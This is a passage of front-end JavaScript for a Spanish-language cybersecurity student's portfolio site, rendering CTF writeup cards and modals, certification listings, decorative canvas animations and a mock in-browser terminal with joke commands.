  $("#inventory").addEventListener("click", (e) => {
    const s = e.target.closest(".slot"); if (!s) return;
    e.stopPropagation();
    s === tipSlot ? closeTip() : openTip(s);
  });
  tip.addEventListener("click", (e) => {
    e.stopPropagation();
    if (e.target.closest(".tip-close")) { const s = tipSlot; closeTip(); s && s.focus(); }
    const nb = e.target.closest("[data-d]"); if (nb) stepTip(+nb.dataset.d);
  });
  document.addEventListener("click", () => tipSlot && closeTip());
  addEventListener("resize", () => tipSlot && placeTip(tipSlot));
  addEventListener("keydown", (e) => {
    if (!tipSlot) return;
    if (e.key === "ArrowRight") { e.preventDefault(); stepTip(1); }
    if (e.key === "ArrowLeft") { e.preventDefault(); stepTip(-1); }
  });
  renderTools("all");

  // certs — all currently in progress
  $("#certs").innerHTML = CERTS.map((c) => `
    <article class="cert ${c.team} reveal" id="cert-${slug(c.c)}">
      <span class="status"><i class="dot"></i>EN PROCESO</span>
      <div class="cert-code">${c.c}</div>
      <div class="rank">${c.track}</div>
      <h3>${c.name}</h3>
      <div class="org">${c.org}</div>
      <p>${c.d}</p>
    </article>`).join("");

  // recursos
  $("#res").innerHTML = RES.map(([n, c]) => `<a class="res reveal" href="${SITE}recursos.html" target="_blank" rel="noopener"><b>${String(c).padStart(2, "0")}</b><span>${n}</span></a>`).join("");

  // writeups
  let wuFilter = "all", wuQuery = "";
  function renderWU() {
    const q = wuQuery.trim().toLowerCase();
    const list = WU.filter((w) =>
      (wuFilter === "all" || w.plat === wuFilter || w.diff === wuFilter) &&
      (!q || (w.name + " " + w.desc + " " + w.tags.join(" ")).toLowerCase().includes(q)));
    $("#wu").innerHTML = list.map((w) => `
      <button type="button" class="wu" id="wu-${w.slug}" data-slug="${w.slug}" aria-haspopup="dialog">
        <div class="wu-meta"><span class="badge">${w.plat}</span><span class="badge ${w.diff === "Fácil" ? "easy" : "veasy"}">${w.diff}</span></div>
        <h3>${esc(w.name)}</h3>
        <p>${esc(w.desc)}</p>
        <div class="tags">${w.tags.map((t) => `<span>${esc(t)}</span>`).join("")}</div>
        <div class="wu-foot"><code>172.17.0.2</code><span class="read">leer writeup →</span></div>
      </button>`).join("");
    $("#wu-count").textContent = list.length;
    $("#wu-empty").hidden = list.length > 0;
    if (window.gsap && !reduced) gsap.from("#wu .wu", { opacity: 0, y: 20, duration: .4, stagger: .03, ease: "power2.out" });
  }
  renderWU();
  $("#wu-filters").addEventListener("click", (e) => {
    const b = e.target.closest(".filter"); if (!b) return;
    $$(".filter").forEach((f) => f.classList.toggle("active", f === b));
    wuFilter = b.dataset.f; renderWU();
  });
  let st; $("#wu-search").addEventListener("input", (e) => { clearTimeout(st); st = setTimeout(() => { wuQuery = e.target.value; renderWU(); }, 150); });

  // ---------- writeup popup ----------
  const wuModal = document.createElement("div");
  wuModal.className = "wu-modal"; wuModal.id = "wu-modal"; wuModal.hidden = true;
  wuModal.setAttribute("role", "dialog"); wuModal.setAttribute("aria-modal", "true"); wuModal.setAttribute("aria-label", "Writeup");
  wuModal.innerHTML = `<div class="wu-modal-backdrop" data-close></div>
    <div class="wu-win" role="document">
      <div class="wu-win-bar">
        <span class="dots"><i></i><i></i><i></i></span>
        <span class="wu-win-title" id="wu-win-title"></span>
        <div class="wu-win-nav">
          <button type="button" class="wu-link" aria-label="Copiar enlace a este writeup">🔗 enlace</button>
          <button type="button" class="wu-prev" aria-label="Writeup anterior">‹</button>
          <button type="button" class="wu-next" aria-label="Writeup siguiente">›</button>
          <button type="button" class="wu-win-close" aria-label="Cerrar" data-close>✕</button>
        </div>
      </div>
      <div class="wu-win-body" id="wu-win-body" tabindex="-1"></div>
    </div>`;
  document.body.appendChild(wuModal);
  const wuBody = $("#wu-win-body"), wuTitle = $("#wu-win-title");
  let wuLast = null;

  function renderBody(blocks) {
    return blocks.map((b) => {
      const [k, t] = b;
      if (k === "h") return `<h4 class="wu-h">${esc(t)}</h4>`;
      if (k === "c") return `<pre class="wu-code"><button type="button" class="wu-copy" aria-label="Copiar">copiar</button><code>${esc(t)}</code></pre>`;
      if (k === "n") return `<div class="wu-note"><b>NOTA</b><p>${t}</p></div>`;
      return `<p>${t}</p>`; // "p": permite <code>/<strong> ya escritos a mano
    }).join("");
  }
  function openWU(slug, focusBack) {
    const i = WU.findIndex((w) => w.slug === slug); if (i < 0) return;
    const w = WU[i];
    wuLast = focusBack || document.activeElement;
    wuModal.dataset.i = i;
    wuTitle.innerHTML = `<span class="m">~/writeups/</span>${esc(w.slug)}.md`;
    const m = w.meta || {};
    const info = (w.informe || []).map((v) => {
      const [sev, title, cwe, owasp, impact, fix] = v;
      return `<article class="vuln sev-${esc(sev.toLowerCase())}">
        <div class="vuln-top"><span class="sev">${esc(sev)}</span><h5>${esc(title)}</h5></div>
        <div class="vuln-refs"><span>${esc(cwe)}</span><span>${esc(owasp)}</span></div>
        <p><b>Impacto.</b> ${esc(impact)}</p>
        <p class="vuln-fix"><b>Mitigación.</b> ${esc(fix)}</p>
      </article>`;
    }).join("");
    wuBody.innerHTML = `
      <div class="wu-win-head">
        <div class="wu-meta"><span class="badge">${w.plat}</span><span class="badge ${w.diff === "Fácil" ? "easy" : "veasy"}">${w.diff}</span></div>
        <h3>${esc(w.name)}</h3>
        <p class="wu-lead">${esc(w.desc)}</p>
        <dl class="wu-facts">
          <div><dt>Objetivo</dt><dd>172.17.0.2</dd></div>
          ${m.services ? `<div><dt>Servicios</dt><dd>${esc(m.services)}</dd></div>` : ""}
          ${m.jumps != null ? `<div><dt>Saltos de usuario</dt><dd>${m.jumps}</dd></div>` : ""}
        </dl>
        <div class="tags">${w.tags.map((t) => `<span>${esc(t)}</span>`).join("")}</div>
      </div>
      <div class="wu-article">${renderBody(w.body || [["p", "Writeup en preparación."]])}</div>
      ${info ? `<div class="wu-report"><h4 class="wu-h">Informe · vulnerabilidades y mitigaciones</h4><div class="vulns">${info}</div></div>` : ""}
      <div class="wu-signoff">— ak1t4 · <span class="m">máquina resuelta · uid=0(root)</span></div>`;
    wuModal.hidden = false; document.body.style.overflow = "hidden";
    wuBody.scrollTop = 0;
    try { history.replaceState(null, "", "#wu-" + w.slug); } catch (e) { location.hash = "wu-" + w.slug; }
    setTimeout(() => wuBody.focus({ preventScroll: true }), 20);
    if (window.gsap && !reduced) gsap.from(".wu-win", { opacity: 0, y: 24, scale: .98, duration: .3, ease: "power2.out", clearProps: "all" });
  }
  function closeWU() {
    if (wuModal.hidden) return;
    wuModal.hidden = true; document.body.style.overflow = "";
    try { history.replaceState(null, "", "#writeups"); } catch (e) {}
    if (wuLast && wuLast.focus) wuLast.focus({ preventScroll: true });
    wuLast = null;
    if (window.ScrollTrigger) ScrollTrigger.refresh();
  }
  // abre el writeup que venga en la URL (#wu-<slug>), y responde a cambios de hash
  function openFromHash() {
    const m = /^#wu-(.+)$/.exec(location.hash);
    if (m && WU.some((w) => w.slug === m[1])) openWU(m[1]);
  }
  function stepWU(d) {
    const i = (+wuModal.dataset.i + d + WU.length) % WU.length;
    openWU(WU[i].slug, wuLast);
  }
  $("#wu").addEventListener("click", (e) => {
    const card = e.target.closest(".wu"); if (!card) return;
    openWU(card.dataset.slug);
  });
  wuModal.addEventListener("click", (e) => {
    if (e.target.closest("[data-close]")) return closeWU();
    if (e.target.closest(".wu-prev")) return stepWU(-1);
    if (e.target.closest(".wu-next")) return stepWU(1);
    const link = e.target.closest(".wu-link");
    if (link) {
      const w = WU[+wuModal.dataset.i];
      const url = location.origin + location.pathname + "#wu-" + w.slug;
      navigator.clipboard?.writeText(url).then(() => {
        link.classList.add("ok"); link.textContent = "✓ copiado";
        setTimeout(() => { link.classList.remove("ok"); link.textContent = "🔗 enlace"; }, 1400);
      }).catch(() => toast(url));
      return;
    }
    const cp = e.target.closest(".wu-copy");
    if (cp) {
      const code = cp.parentElement.querySelector("code").textContent;
      navigator.clipboard?.writeText(code).then(() => { cp.textContent = "copiado"; setTimeout(() => (cp.textContent = "copiar"), 1200); }).catch(() => {});
    }
  });
  addEventListener("hashchange", () => { if (/^#wu-/.test(location.hash)) openFromHash(); });
  addEventListener("keydown", (e) => {
    if (wuModal.hidden) return;
    if (e.key === "Escape") { e.preventDefault(); closeWU(); }
    if (e.key === "ArrowLeft") stepWU(-1);
    if (e.key === "ArrowRight") stepWU(1);
  });

  // index: writeups grouped by difficulty, each group collapsible with its machines
  const CHEV = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m9 6 6 6-6 6"/></svg>';
  $("#side-wu").innerHTML = `<li><a href="#writeups" data-wu="all">Todas <em>${WU.length}</em></a></li>` +
    ["Fácil", "Muy fácil"].map((d) => {
      const ms = WU.filter((w) => w.diff === d);
      return `<li class="side-cat"><button class="side-cat-btn" type="button" aria-expanded="false">${d} <em>${ms.length}</em>${CHEV}</button>
        <div class="side-cat-sub"><ul>${ms.map((w) => `<li><a href="#wu-${w.slug}" data-wu-go="${w.slug}">${esc(w.name)}</a></li>`).join("")}</ul></div></li>`;
    }).join("");

  // side index: drawer on mobile, collapsible on desktop, accordion sub-items
  const root = document.documentElement, burger = $("#burger"), backdrop = $("#side-backdrop"), sideToggle = $("#side-toggle");
  const isMobile = () => matchMedia("(max-width: 900px)").matches;
  const setMenu = (open) => {
    root.classList.toggle("side-open", open); backdrop.hidden = !open;
    burger.setAttribute("aria-expanded", open); document.body.style.overflow = open ? "hidden" : "";
  };
  burger.addEventListener("click", () => setMenu(!root.classList.contains("side-open")));
  backdrop.addEventListener("click", () => setMenu(false));
  const syncToggle = () => sideToggle.setAttribute("aria-label", root.classList.contains("side-collapsed") ? "Desplegar índice" : "Plegar índice");
  syncToggle();
  sideToggle.addEventListener("click", () => {
    const collapsed = root.classList.toggle("side-collapsed");
    syncToggle();
    try { localStorage.setItem("ak-side", collapsed ? "0" : "1"); } catch (e) {}
    setTimeout(() => dispatchEvent(new Event("resize")), 330); // re-measure canvas, popover, triggers
  });
  const manualOpen = new Set();
  const setOpen = (item, open) => {
    item.classList.toggle("open", open);
    const c = item.querySelector(".side-chev"); if (c) c.setAttribute("aria-expanded", open);
  };
  $("#sidenav").addEventListener("click", (e) => {
    const chev = e.target.closest(".side-chev");
    if (chev) {
      const it = chev.closest(".side-item"), open = !it.classList.contains("open");
      setOpen(it, open); open ? manualOpen.add(it) : manualOpen.delete(it);
      return;
    }
    const cat = e.target.closest(".side-cat-btn");
    if (cat) { const open = cat.parentElement.classList.toggle("open"); cat.setAttribute("aria-expanded", open); return; }
    const a = e.target.closest("a"); if (!a) return;
    if (a.dataset.wuGo) { if (isMobile()) setMenu(false); openWU(a.dataset.wuGo); return; }
    if (a.dataset.team) $(`.team[data-team="${a.dataset.team}"]`).click();
    if (a.dataset.wu) $(`.filter[data-f="${a.dataset.wu}"]`).click();
    const h = a.getAttribute("href");
    if (h.startsWith("#h-") && !$(h)) $('#tool-tabs .tab[data-type="all"]').click();
    if (isMobile()) setMenu(false);
  });
  addEventListener("resize", () => { if (!isMobile()) setMenu(false); });

  /* ---------------- TOAST ---------------- */
  let tt;
  function toast(msg) { const t = $("#toast"); t.textContent = msg; t.classList.add("show"); clearTimeout(tt); tt = setTimeout(() => t.classList.remove("show"), 2600); }

  /* ---------------- CLOCK ---------------- */
  const clock = $("#clock");
  const tick = () => { clock.textContent = new Date().toLocaleTimeString("es-ES", { hour12: false }); };
  tick(); setInterval(tick, 1000);

  /* ---------------- CRT TOGGLE ---------------- */
  const crtBtn = $("#crt-toggle");
  const setCrt = (on) => { document.body.classList.toggle("no-crt", !on); crtBtn.textContent = "CRT: " + (on ? "ON" : "OFF"); try { localStorage.setItem("ak-crt", on ? "1" : "0"); } catch (e) {} };
  let crtPref = "0"; try { crtPref = localStorage.getItem("ak-crt") ?? "0"; } catch (e) {}
  setCrt(crtPref === "1");
  crtBtn.addEventListener("click", () => setCrt(document.body.classList.contains("no-crt")));

  /* ---------------- MATRIX RAIN (fondo global) ---------------- */
  (function matrix() {
    const cv = document.createElement("canvas");
    cv.id = "matrix"; cv.setAttribute("aria-hidden", "true");
    document.body.prepend(cv);
    const ctx = cv.getContext("2d");
    const CHARS = "アカサタナハマヤラワイキシチニヒミリヰウクスツヌフムユルエケセテネヘメレヱオコソトノホモヨロヲ0123456789:/\\$#*+<>".split("");
    let w, h, dpr, cols, drops, fs, visible = true;
    function resize() {
      dpr = Math.min(devicePixelRatio || 1, 2);
      w = innerWidth; h = innerHeight;
      cv.width = w * dpr; cv.height = h * dpr; ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      fs = w < 600 ? 13 : 16;
      cols = Math.ceil(w / fs);
      drops = Array.from({ length: cols }, () => Math.random() * -40);
      ctx.clearRect(0, 0, w, h);
    }
    resize();
    addEventListener("resize", resize);
    document.addEventListener("visibilitychange", () => { visible = !document.hidden; });
    let last = 0;
    function draw(t) {
      requestAnimationFrame(draw);
      if (!visible || document.body.classList.contains("no-matrix")) return;
      if (t - last < 55) return; last = t; // ~18 fps, suficiente y ligero
      ctx.fillStyle = "rgba(13, 10, 16, .10)"; // estela: desvanece lo anterior
      ctx.fillRect(0, 0, w, h);
      ctx.font = fs + "px 'IBM Plex Mono', monospace";
      for (let i = 0; i < cols; i++) {
        const ch = CHARS[(Math.random() * CHARS.length) | 0];
        const x = i * fs, y = drops[i] * fs;
        ctx.fillStyle = "rgba(255, 36, 71, .75)";            // cuerpo rojo
        ctx.fillText(ch, x, y);
        if (Math.random() < .5) { ctx.fillStyle = "rgba(255, 220, 228, .9)"; ctx.fillText(ch, x, y); } // cabeza clara
        if (y > h && Math.random() > .975) drops[i] = Math.random() * -20;
        drops[i] += 0.5;
      }
    }
    if (reduced) { // una sola pasada estática
      ctx.font = fs + "px 'IBM Plex Mono', monospace"; ctx.fillStyle = "rgba(255,36,71,.3)";
      for (let i = 0; i < cols; i++) ctx.fillText(CHARS[(Math.random() * CHARS.length) | 0], i * fs, (Math.random() * h));
    } else requestAnimationFrame(draw);
  })();

  /* ---------------- HUD CANVAS (speed lines · rings · network) ---------------- */
  (function hud() {
    const cv = $("#synth"), ctx = cv.getContext("2d");
    let w, h, dpr, visible = true, mx = -999, my = -999, nodes = [], rays = [], cx = 0, cy = 0, k = 1;
    function center() {
      const z = zoomK(), av = $(".hero-avatar .frame").getBoundingClientRect(), hr = cv.getBoundingClientRect();
      cx = (av.left - hr.left + av.width / 2) / z; cy = (av.top - hr.top + av.height / 2) / z; k = av.width / 196;
    }
    function resize() {
      dpr = Math.min(devicePixelRatio || 1, 2);
      w = cv.clientWidth; h = cv.clientHeight;
      cv.width = w * dpr; cv.height = h * dpr; ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
      center();
      const n = Math.min(90, Math.round(w * h / 15000));
      nodes = Array.from({ length: n }, () => ({
        x: Math.random() * w, y: Math.random() * h, vx: (Math.random() - .5) * .35, vy: (Math.random() - .5) * .35,
        r: Math.random() * 1.6 + .8, c: Math.random() < .22 ? "240,58,101" : "236,228,244",
      }));
      rays = Array.from({ length: 90 }, () => ({ a: Math.random() * Math.PI * 2, wd: Math.random() * .012 + .002, ph: Math.random() * 6 }));
    }
    resize(); addEventListener("resize", resize);
    setTimeout(center, 1600); // after intro animation settles
    cv.parentElement.addEventListener("mousemove", (e) => { const r = cv.getBoundingClientRect(), z = zoomK(); mx = (e.clientX - r.left) / z; my = (e.clientY - r.top) / z; });
    cv.parentElement.addEventListener("mouseleave", () => { mx = my = -999; });
    new IntersectionObserver(([en]) => { visible = en.isIntersecting; }).observe(cv);

    function draw(t) {
      if (!reduced) requestAnimationFrame(draw);
      if (!visible) return;
      ctx.clearRect(0, 0, w, h);
      const R = Math.max(w, h) * 1.2;

      // network nodes
      for (const n of nodes) {
        n.x += n.vx; n.y += n.vy;
        if (n.x < -10) n.x = w + 10; if (n.x > w + 10) n.x = -10;
        if (n.y < -10) n.y = h + 10; if (n.y > h + 10) n.y = -10;
      }
      ctx.lineWidth = 1;
      for (let i = 0; i < nodes.length; i++) {
        const a = nodes[i];
        for (let j = i + 1; j < nodes.length; j++) {
          const b = nodes[j], dx = a.x - b.x, dy = a.y - b.y, d = dx * dx + dy * dy;
          if (d < 14400) { ctx.strokeStyle = `rgba(236,228,244,${(1 - Math.sqrt(d) / 120) * .13})`; ctx.beginPath(); ctx.moveTo(a.x, a.y); ctx.lineTo(b.x, b.y); ctx.stroke(); }
        }
        const mdx = a.x - mx, mdy = a.y - my, md = Math.sqrt(mdx * mdx + mdy * mdy);
        if (md < 170) { ctx.strokeStyle = `rgba(240,58,101,${(1 - md / 170) * .7})`; ctx.beginPath(); ctx.moveTo(a.x, a.y); ctx.lineTo(mx, my); ctx.stroke(); }
        ctx.fillStyle = `rgba(${a.c},.6)`; ctx.beginPath(); ctx.arc(a.x, a.y, a.r, 0, Math.PI * 2); ctx.fill();
      }
      if (mx > 0) {
        ctx.strokeStyle = "rgba(240,58,101,.8)"; ctx.beginPath(); ctx.arc(mx, my, 6 + Math.sin(t / 200) * 2, 0, Math.PI * 2); ctx.stroke();
      }
    }
    requestAnimationFrame(draw);
  })();

  /* ---------------- TYPEWRITER ---------------- */
  const phrases = [
    "Técnico en Telecomunicaciones enfocado en Ciberseguridad — Red & Blue Team.",
    "Hacker en formación · Red & Blue Team · 修行中。",
    "Rompo máquinas en DockerLabs. Luego aprendo a protegerlas.",
    "OSINT · Pentesting · DFIR · Homelab · IA.",
  ];
  function typeLoop() {
    const el = $("#typer"); let p = 0, i = 0, del = false;
    if (reduced) { el.textContent = phrases[0]; return; }
    (function step() {
      const s = phrases[p];
      el.textContent = s.slice(0, i);
      if (!del && i < s.length) { i++; return setTimeout(step, 32 + Math.random() * 40); }
      if (!del) { del = true; return setTimeout(step, 2200); }
      if (i > 0) { i--; return setTimeout(step, 14); }
      del = false; p = (p + 1) % phrases.length; setTimeout(step, 300);
    })();
  }

  /* ---------------- SCROLL ANIMS ---------------- */
  function scrollAnims() {
    // counters
    $$("[data-count]").forEach((el) => {
      const n = +el.dataset.count;
      if (reduced || !window.gsap) { el.textContent = n; return; }
      const o = { v: 0 }; gsap.to(o, { v: n, duration: 1.6, delay: .3, ease: "power2.out", onUpdate: () => (el.textContent = Math.round(o.v)) });
    });
    // bars
    const barIO = new IntersectionObserver((ens) => ens.forEach((en) => {
      if (en.isIntersecting) { en.target.style.width = en.target.dataset.w + "%"; barIO.unobserve(en.target); }
    }), { threshold: .5 });
    $$(".bar i[data-w]").forEach((b) => barIO.observe(b));

    if (!window.gsap || !window.ScrollTrigger || reduced) return;
    gsap.registerPlugin(ScrollTrigger);
    $$(".reveal").forEach((el) => gsap.from(el, {
      opacity: 0, y: 40, duration: .8, ease: "power3.out",
      scrollTrigger: { trigger: el, start: "top 88%", once: true },
    }));
    gsap.utils.toArray(".sec-head h2").forEach((h) => gsap.from(h, {
      clipPath: "inset(0 100% 0 0)", duration: .9, ease: "steps(14)", clearProps: "clipPath",
      scrollTrigger: { trigger: h, start: "top 90%", once: true },
    }));
    gsap.to(".side-jp", { yPercent: -40, ease: "none", scrollTrigger: { trigger: ".hero", start: "top top", end: "bottom top", scrub: true, invalidateOnRefresh: true } });
    // parallax sutil del héroe, sin atenuar la opacidad (evita que se quede oscurecido al saltar entre secciones)
    gsap.to(".hero-inner", { yPercent: -8, ease: "none", scrollTrigger: { trigger: ".hero", start: "top top", end: "bottom top", scrub: true, invalidateOnRefresh: true } });
  }

  // active nav · breadcrumb · scroll progress
  const items = $$(".side-item"), crumb = $("#crumb");
  const secIO = new IntersectionObserver((ens) => ens.forEach((en) => {
    if (!en.isIntersecting) return;
    const sid = en.target.id, id = sid === "consola" ? "inicio" : sid;
    items.forEach((it) => {
      const on = it.dataset.sec === id;
      it.classList.toggle("active", on);
      if (it.querySelector(".side-sub") && !manualOpen.has(it)) setOpen(it, on);
    });
    const it = items.find((x) => x.dataset.sec === id);
    crumb.textContent = sid === "consola" ? "terminal" : (it ? it.querySelector(".side-link span").textContent.toLowerCase() : sid);
    $("#crumb-num").textContent = it ? it.querySelector(".side-link b").textContent : "01";
  }), { rootMargin: "-45% 0px -50% 0px" });
  $$("main section[id]").forEach((sec) => secIO.observe(sec));
  const prog = $("#progress"), rprog = $("#rail-progress");
  const onScroll = () => {
    const p = Math.min(1, scrollY / Math.max(1, document.documentElement.scrollHeight - innerHeight)) * 100;
    prog.style.width = p + "%"; rprog.textContent = Math.round(p) + "%";
  };
  addEventListener("scroll", onScroll, { passive: true }); onScroll();

  /* ---------------- TERMINAL (inline) ---------------- */
  const out = $("#term-out"), inp = $("#term-input"), PROMPT = `<span class="p">ak1t4@hq:~$</span> `;
  const hist = []; let hi = 0, busy = false;
  const print = (html) => { out.insertAdjacentHTML("beforeend", html + "\n"); out.scrollTop = out.scrollHeight; };
  const SECTIONS = ["inicio", "formacion", "idiomas", "experiencia", "certificaciones", "perfiles", "herramientas", "writeups"];
  const BIO = "Técnico en Telecomunicaciones, muy centrado en la ciberseguridad. Me gusta atacar y defender a partes iguales: resolver máquinas de DockerLabs y CTFs, y entender cómo se protege lo que rompo. Además me manejo muy bien con la IA como herramienta de trabajo —Claude, Claude Code— y la considero una aliada potente y muy útil en el día a día. Mi meta es sacarme la titulación de Ciberseguridad e ir sumando certificaciones de Red y Blue Team.";
  const WHOAMI = `<span class="c">Adrián Sepúlveda Ramos</span> <span class="m">(ak1t4)</span> — Técnico en Telecomunicaciones · Ciberseguridad Red &amp; Blue Team`;
  const CMDS = {
    help: () => print(`<span class="y">Comandos disponibles</span>
  <span class="c">whoami</span>          quién soy
  <span class="c">cat bio.txt</span>     biografía
  <span class="c">ls</span>              listar secciones
  <span class="c">cd</span> &lt;sección&gt;     ir a una sección (ej: cd writeups)
  <span class="c">writeups</span>        máquinas resueltas
  <span class="c">open</span> &lt;máquina&gt;  abrir un writeup (ej: open flynn)
  <span class="c">certs</span>           hoja de ruta de certificaciones
  <span class="c">tool</span> &lt;nombre&gt;   qué es una herramienta (ej: tool nmap)
  <span class="c">social</span>          enlaces
  <span class="c">crt</span>             alternar scanlines
  <span class="c">clear</span>           limpiar la consola`),
    whoami: () => print(WHOAMI),
    cat: (a) => (a || "").replace(/^\.\//, "") === "bio.txt"
      ? print(`<span class="bio">${BIO}</span>`)
      : print(`<span class="p">cat: ${esc(a || "")}: No existe el fichero</span> — prueba 'cat bio.txt'`),
    ls: () => print(`<span class="c">bio.txt</span>  ` + SECTIONS.map((s, i) => `<span class="m">0${i + 1}_</span>${s}/`).join("  ")),
    cd: (a) => {
      const q = (a || "").toLowerCase().replace(/^0\d_/, "").replace(/\/$/, "");
      const t = q && SECTIONS.find((s) => s.startsWith(q));
      if (!t) return print(`<span class="p">cd: ${esc(a || "")}: No existe la sección</span> — prueba 'ls'`);
      print(`<span class="m">→ /${t}</span>`); $("#" + t).scrollIntoView({ behavior: reduced ? "auto" : "smooth" });
    },
    writeups: () => print(WU.map((w) => `<span class="${w.diff === "Fácil" ? "p" : "m"}">[${w.diff.padEnd(9)}]</span> ${esc(w.name)}`).join("\n") + `\n<span class="m">→ 'open &lt;máquina&gt;' para leer uno</span>`),
    open: (a) => {
      const q = (a || "").toLowerCase();
      const w = WU.find((x) => x.slug === q || x.name.toLowerCase() === q) || (q && WU.find((x) => x.name.toLowerCase().includes(q)));
      if (!w) return print(`<span class="p">open: máquina no encontrada.</span> Prueba 'writeups'.`);
      print(`Abriendo writeup de <span class="c">${esc(w.name)}</span>…`);
      openWU(w.slug);
    },
    certs: () => print(`<span class="y">Certificaciones en proceso</span>\n` +
      CERTS.map((c) => `  <span class="p">●</span> ${c.c.padEnd(10)}<span class="m">${c.org} · ${c.track.toLowerCase()}</span>`).join("\n")),
    tool: (a) => {
      const q = (a || "").toLowerCase();
      const t = ALL_TOOLS.find((x) => x.name.toLowerCase() === q) || ALL_TOOLS.find((x) => q && x.name.toLowerCase().includes(q));
      if (!t) return print(`<span class="p">tool: uso 'tool nmap'.</span> Disponibles: ${ALL_TOOLS.map((x) => x.name).join(", ")}`);
      print(`<span class="c">${esc(t.name)}</span> <span class="m">[${esc(t.cat)}]</span>\n${esc(t.desc)}`);
    },
    social: () => print(`GitHub      <a href="https://github.com/ak1ta4" target="_blank" rel="noopener">github.com/ak1ta4</a>
DockerLabs  <a href="https://dockerlabs.es/perfil/ak1t4" target="_blank" rel="noopener">@ak1t4</a>
TryHackMe   <a href="https://tryhackme.com/p/ak1t4" target="_blank" rel="noopener">@ak1t4</a>
HackTheBox  @ak1t4`),
    crt: () => { crtBtn.click(); print("scanlines " + (document.body.classList.contains("no-crt") ? "OFF" : "ON")); },
    clear: () => { out.innerHTML = ""; },
    exit: () => print(`<span class="m">No hay salida… prueba 'cd inicio'.</span>`),
    sudo: () => print(`<span class="p">[sudo] contraseña para visitante:</span> buen intento — esto no es una máquina de DockerLabs.`),
    rm: () => print(`<span class="p">rm: permiso denegado.</span>`),
  };
  function exec(raw) {
    raw = raw.trim();
    print(PROMPT + esc(raw));
    if (!raw) return;
    hist.push(raw); hi = hist.length;
    const [cmd, ...args] = raw.split(/\s+/);
    (CMDS[cmd.toLowerCase()] || (() => print(`<span class="p">${esc(cmd)}: comando no encontrado</span> — prueba 'help'`)))(args.join(" "));
  }
  // types a command into the prompt, then runs it
  function typeRun(cmd, then) {
    if (reduced) { exec(cmd); if (then) then(); return; }
    busy = true; let i = 0; inp.value = "";
    const id = setInterval(() => {
      inp.value = cmd.slice(0, ++i);
      if (i >= cmd.length) {
        clearInterval(id);
        setTimeout(() => { inp.value = ""; exec(cmd); busy = false; if (then) then(); }, 160);
      }
    }, 45);
  }
  function focusTerm() {
    $("#consola").scrollIntoView({ behavior: reduced ? "auto" : "smooth", block: "center" });
    setTimeout(() => inp.focus({ preventScroll: true }), reduced ? 0 : 450);
  }
  function consoleIntro() {
    let started = false;
    new IntersectionObserver(([en], obs) => {
      if (!en.isIntersecting || started) return;
      started = true; obs.disconnect();
      typeRun("whoami", () => typeRun("cat bio.txt", () =>
        print(`\n<span class="m">Escribe</span> <span class="p">help</span> <span class="m">o pulsa una sugerencia de abajo.</span>`)));
    }, { threshold: .35 }).observe($(".console"));
  }
  $("#term-open").addEventListener("click", focusTerm);
  $("#term-form").addEventListener("submit", (e) => { e.preventDefault(); if (busy) return; const v = inp.value; inp.value = ""; exec(v); });
  $("#term-chips").addEventListener("click", (e) => { const b = e.target.closest("[data-cmd]"); if (b && !busy) typeRun(b.dataset.cmd); });
  out.addEventListener("click", () => { if (!getSelection().toString()) inp.focus({ preventScroll: true }); });
  inp.addEventListener("keydown", (e) => {
    if (e.key === "ArrowUp" && hi > 0) { inp.value = hist[--hi]; e.preventDefault(); }
    if (e.key === "ArrowDown") { hi = Math.min(hist.length, hi + 1); inp.value = hist[hi] || ""; e.preventDefault(); }
    if (e.key === "Tab") {
      e.preventDefault();
      const m = Object.keys(CMDS).filter((c) => c.startsWith(inp.value));
      if (m.length === 1) inp.value = m[0] + " ";
    }
  });

  function sakura() {
    toast("桜 · sakura mode");
    for (let i = 0; i < 60; i++) {
      const p = document.createElement("span");
      p.className = "petal";
      p.style.left = Math.random() * 100 + "vw";
      p.style.setProperty("--dx", (Math.random() * 200 - 100) + "px");
      p.style.animationDuration = 4 + Math.random() * 4 + "s";
      p.style.animationDelay = Math.random() * 2.5 + "s";
      document.body.appendChild(p);
      setTimeout(() => p.remove(), 9000);
    }
  }

  /* ---------------- KEYS / KONAMI ---------------- */
  const KONAMI = ["ArrowUp", "ArrowUp", "ArrowDown", "ArrowDown", "ArrowLeft", "ArrowRight", "ArrowLeft", "ArrowRight", "b", "a"];
  let kp = 0;
  addEventListener("keydown", (e) => {
    const typing = /INPUT|TEXTAREA/.test(document.activeElement?.tagName);
    if (e.key === "Escape") { setMenu(false); closeTip(); if (document.activeElement === inp) inp.blur(); }
    if (!typing && (e.key === "`" || e.key === "º")) { e.preventDefault(); focusTerm(); }
    if (typing) return;
    if (tipSlot && /Arrow/.test(e.key)) return;
    kp = e.key.toLowerCase() === KONAMI[kp].toLowerCase() ? kp + 1 : (e.key === KONAMI[0] ? 1 : 0);
    if (kp === KONAMI.length) { kp = 0; sakura(); }
  });

  /* ---------------- BOOT ---------------- */
  function boot(done) {
    const el = $("#boot"), log = $("#boot-log"), fill = $("#boot-fill");
    let seen = false; try { seen = sessionStorage.getItem("ak-boot") === "1"; } catch (e) {}
    const finish = () => {
      if (el.classList.contains("done")) return;
      el.classList.add("done"); document.body.classList.remove("booting");
      try { sessionStorage.setItem("ak-boot", "1"); } catch (e) {}
      setTimeout(() => el.remove(), 700); done();
    };
    if (reduced || seen) { el.remove(); done(); return; }
    document.body.classList.add("booting");
    const lines = [
      `<span class="c">AK1T4//HQ</span> · system boot <span class="m">v3.0</span>`,
      `<span class="m">────────────────────────────────────────</span>`,
      `[<span class="y"> OK </span>] Cargando núcleo ........... TELECOM.kernel`,
      `[<span class="y"> OK </span>] Módulos ofensivos ......... red_team`,
      `[<span class="y"> OK </span>] Módulos defensivos ........ blue_team`,
      `[<span class="y"> OK </span>] Enlace con DockerLabs ..... 172.17.0.2`,
      `[<span class="y"> OK </span>] Sincronizando perfil ...... ak1t4`,
      ``,
      `<span class="p">システム起動完了。</span> ようこそ!`,
    ];
    let i = 0;
    const id = setInterval(() => {
      log.innerHTML += lines[i] + "\n";
      fill.style.width = ((i + 1) / lines.length * 100) + "%";
      if (++i >= lines.length) { clearInterval(id); setTimeout(finish, 650); }
    }, 230);
    $("#boot-skip").addEventListener("click", () => { clearInterval(id); finish(); });
    addEventListener("keydown", function k(e) { if (e.key === "Escape" || e.key === "Enter") { clearInterval(id); finish(); removeEventListener("keydown", k); } });
  }

  boot(() => {
    typeLoop();
    consoleIntro();
    scrollAnims();
